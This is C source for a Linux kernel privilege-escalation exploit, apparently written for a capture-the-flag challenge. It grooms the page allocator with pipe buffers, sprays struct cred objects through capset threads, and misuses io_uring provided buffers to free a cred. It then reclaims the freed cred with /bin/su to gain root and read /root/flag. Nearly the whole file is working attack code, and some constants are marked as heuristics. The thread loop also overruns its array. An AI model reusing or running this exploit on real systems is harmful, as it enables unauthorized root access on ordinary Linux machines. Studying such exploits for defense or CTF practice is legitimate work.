#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <liburing.h>
#include <linux/capability.h>
#include <linux/types.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/capability.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/xattr.h>
#include <unistd.h>

#define UNIMPLEMENTED() assert(0 && "unimplemented")
#define UNIMPLEMENTED_(n) (n)
#define errExit(msg)    \
  do {                  \
    perror(msg);        \
    exit(EXIT_FAILURE); \
  } while (0)
#define WAIT()            \
  do {                    \
    puts("[WAITING...]"); \
    getchar();            \
  } while (0)

#define logOK(msg, ...) dprintf(2, "[+] " msg "\n", ##__VA_ARGS__);
#define logInfo(msg, ...) dprintf(2, "[*] " msg "\n", ##__VA_ARGS__);
#define logErr(msg, ...) dprintf(2, "[!] " msg "\n", ##__VA_ARGS__);

#define ulong unsigned long
#define PAGE 0x1000UL
#define NUM_IOBUF \
  0x290  // UNIMPLEMENTED:
         // Tweak so the last io_buffer is near the end of the page
char iobufs[PAGE][NUM_IOBUF] = {0};

/**
 * @brief State shared between threads
 */
struct state {
  // Whether page splitting using pipe_buffer is finished or not
  int page_split;
  // Number of threads that finished cred spray by setcap()
  int cred_spray_num;
  // Check free cred
  int free_cred;
  // Check done
  int pwn;
};

struct state *state;
pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;

/**
 * @brief Initialize state that can be shared between threads
 *
 * @return struct state* shared state
 */
struct state *initialize_shared_state(void) {
  int shm_id = shmget(IPC_PRIVATE, PAGE, 0666 | IPC_CREAT);
  if (shm_id < 0) errExit("shmget");

  return (struct state *)shmat(shm_id, NULL, 0);
}

/**
 * Open /proc/self/maps
 *
 * @return int fd in /proc/self/maps
 */
int open_maps(void) {
  int fd = open("/proc/self/maps", O_RDONLY);
  assert(fd >= 2);
  return fd;
}

/**
 * @brief Set up io_uring
 *
 * @param ring io_uring
 */
void init_uring(struct io_uring *ring) { io_uring_queue_init(1024, ring, 0); }

/**
 * @brief Read using Buffer Group
 *
 * @param ring io_uring
 * @param fd fd of the file you want to read
 * @param size size to read
 * @param offset Offset to read
 * @param bgid BGID of Buffer Group (Buffer Group ID)
 */
void ring_submit_read(struct io_uring *ring, int fd, size_t size, ulong offset,
                      int bgid) {
  struct io_uring_sqe *sqe = NULL;

  // Get available SQEs
  sqe = io_uring_get_sqe(ring);
  // Pack the request into SQE
  io_uring_prep_read(sqe, fd, NULL, size, offset);
  // set flag to use Buffer Group
  io_uring_sqe_set_flags(sqe, IOSQE_BUFFER_SELECT);
  // Set BGID (refer to the definition of struct io_uring_sqe)
  sqe->buf_group = bgid;
  // notify kernel
  io_uring_submit(ring);
}

/**
 * @brief Share Buffer Group with kernel
 *
 * @param ring io_uring
 * @param buf_addr Start address of the buffer you want to share
 * @param len Size of one buffer you want to share
 * @param num number of buffers you want to share
 * @param bgid Group ID of the Buffer Group you want to share
 * @param bid_start Starting number of Buffer ID of Buffer Group you want to
 * share
 */
void ring_submit_buffer(struct io_uring *ring, char *buf_addr, int len, int num,
                        int bgid, int bid_start) {
  struct io_uring_sqe *sqe = NULL;
  struct io_uring_cqe *cqe = NULL;

  // Get available SQEs
  sqe = io_uring_get_sqe(ring);
  // Pack the request into SQE
  io_uring_prep_provide_buffers(sqe, buf_addr, len, num, bgid, bid_start);
  // notify kernel
  assert(io_uring_submit(ring) >= 0);
}

/**
 * @brief Wait until response is returned to CQ
 *
 * @return int CQE res (BID of used buffer)
 *
 * @param ring io_uring
 */
int ring_wait_cqe(struct io_uring *ring) {
  struct io_uring_cqe *cqe = NULL;

  // Get the CQE that was returned as a response
  io_uring_wait_cqe(ring, &cqe);
  assert(cqe->res >= 0);
  int ret = cqe->res;
  io_uring_cqe_seen(ring, cqe);
  return ret;
}

/**
 * @brief Thread function to secure `struct cred` at the right time
 *
 * @param arg
 * @return void*
 */
void *setcap_worker(void *arg) {
  struct __user_cap_header_struct cap_header = {
      .version = _LINUX_CAPABILITY_VERSION_1,
      .pid = gettid(),
  };
  struct __user_cap_data_struct cap_data;

  /**
   * Prepare for capset()
   */
  if (capget(&cap_header, &cap_data) < 0) errExit("capget");
  cap_data.effective = 0x0;
  cap_data.permitted = 0x0;
  cap_data.inheritable = 0x0;

  /**
   * Wait until page division by pipe_buffer is finished
   */
  while (state->page_split == 0) {
    usleep(1000);
  }

  /**
   * Allocate `struct cred` from odd pages
   */
  pthread_mutex_lock(&lock);
  {
    if (capset(&cap_header, &cap_data) < 0) errExit("capset");
    ++state->cred_spray_num;
  }
  pthread_mutex_unlock(&lock);
  while (state->pwn == 0) {
    if (getuid() == 0 || geteuid() == 0) {
      int fd = open("/root/flag", O_RDONLY);
      printf("%d\n", fd);
      if (fd < 0) exit(-1);
      char buf[0x100] = {0};
      read(fd, buf, sizeof(buf));
      write(1, "[!] flag: ", 9);
      write(1, buf, 80);
      write(1, "\n", 1);
      return NULL;
    } else {
      usleep(100);
    }
  }

  sleep(500);  // EOL
  return NULL;
}

void pinning_thread(int core) {
  cpu_set_t mask;

  CPU_ZERO(&mask);
  CPU_SET(core, &mask);

  if (pthread_setaffinity_np(pthread_self(), sizeof(mask), &mask) < 0) {
    errExit("pthread_setaffinity_np");
  }
}

void *su_worker(void *arg) {
  while (state->free_cred == 0) {
    usleep(1000);
  }

  pinning_thread(0);
  system("/bin/su");

  sleep(99999);

  return NULL;
}

int main(void) {
  struct io_uring ring;
  int fd = open_maps();

  // Pin cpu 0
  pinning_thread(0);

  // Initialize ring
  init_uring(&ring);

  /**
   * Prepare a memory area to share information between threads.
   */
  logInfo("Initiating shared state...");
  state = initialize_shared_state();

/**
 * Prepare only `CAPSET_THREAD_NUM` threads that perform capset.
 */
#define CAPSET_THREAD_NUM 0x50
  logInfo("Creating capset threads...");
  pthread_t setcap_pids[CAPSET_THREAD_NUM];
  for (uint i = 0; i < 0x80; ++i) {
    pthread_create(&setcap_pids[i], NULL, setcap_worker, NULL);
  }

  /**
   * Wait a moment for the thread to be created
   */
  usleep(1000);
  pinning_thread(0);

#define SU_THREAD_NUM 0x5
  logInfo("Creating su threads...");
  pthread_t su_pids[SU_THREAD_NUM];
  for (int ix = 0; ix < SU_THREAD_NUM; ix++) {
    pthread_create(&su_pids[ix], NULL, su_worker, NULL);
  }

  usleep(1000);
  pinning_thread(0);

  /**
   * Prepare a large number of pipes (`SPRAY_PIPE_NUM`)
   */
#define SPRAY_PIPE_NUM 0x60
  logInfo("Creating pipe buffers...");
  int pipefds[SPRAY_PIPE_NUM][2];
  for (int ix = 0; ix != SPRAY_PIPE_NUM; ++ix) {
    if (pipe(pipefds[ix]) < 0) errExit("pipe");
  }
  usleep(5000);

  /**
   * Allocate a page by writing to pipe.
   * By securing a large amount, Buddy
   * Splits pages from Allocator's Order-1 or higher list.
   */
  logInfo("Draining pages from higherorder lists...");
  for (uint ix = 0; ix < SPRAY_PIPE_NUM; ++ix) {
    write(pipefds[ix][1], iobufs, 1);
  }

  pinning_thread(0);

  /**
   * By closing the even-numbered pipe, the buffer (page) is released and
   * returned to Buddy (Order-0). NOTE: If you release consecutive pages here,
   * Buddy Allocator merges pages and takes them to Order-1 or higher.
   */
  logInfo("Closing even pages...");
  for (uint i = 0; i < SPRAY_PIPE_NUM; i += 2) {
    close(pipefds[i][0]);
    close(pipefds[i][1]);
  }

  /**
   * Notify the capset thread that page division using pipe_buffer has finished.
   * Taking this as a signal, the capset thread allocates `struct cred` from odd
   * numbered pages.
   */
  state->page_split = 1;

  /**
   * Wait until the cred spray finishes.
   */
  while (state->cred_spray_num < CAPSET_THREAD_NUM) {
    usleep(1000);
  }
  pinning_thread(0);

  /**
   * Close the odd numbered pipe and return it to Buddy (Order-0).
   * This page will be used later for kmalloc-32 (io_buffer).
   */
  logInfo("Closing odd pages...");
  for (uint i = 1; i < SPRAY_PIPE_NUM; i += 2) {
    close(pipefds[i][0]);
    close(pipefds[i][1]);
  }

  /**
   * Reserve a large amount of `io_buffer` in kmalloc-32.
   * When it runs out of cached pages, SLUB requests pages from Buddy,
   * The even numbered pages that were released earlier will be used.
   */
  logInfo("Allocating io_buffer in odd pages...");
  ring_submit_buffer(&ring, (char *)iobufs, PAGE, NUM_IOBUF, 0, 0);
  ring_wait_cqe(&ring);

  /**
   * Attach GDB here.
   * Check the page with the last `io_buffer`, and the next page is
   * Make sure it is `struct cred`.
   */

  logInfo("Trying to free cred ...");
  const ulong cred_offset = 0xe0;  // HEURISTIC
  ring_submit_read(&ring, fd, cred_offset, 0, 0);
  assert(ring_wait_cqe(&ring) == cred_offset);

  logOK("Done");
  state->free_cred = 1;

  sleep(30);
  logErr("Exploit fail :(");
  return 0;
}